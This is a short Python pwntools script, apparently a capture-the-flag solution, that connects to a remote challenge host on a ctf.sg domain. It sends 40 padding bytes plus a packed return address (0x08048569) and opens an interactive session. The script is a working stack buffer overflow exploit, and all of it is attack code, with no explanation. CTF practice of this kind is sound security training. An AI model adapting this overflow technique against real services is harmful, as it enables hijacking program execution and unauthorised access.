from pwn import * 

p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30601)

OFFSET = 40

p.sendline(b"A" * OFFSET + p32(0x08048569)) 
p.interactive()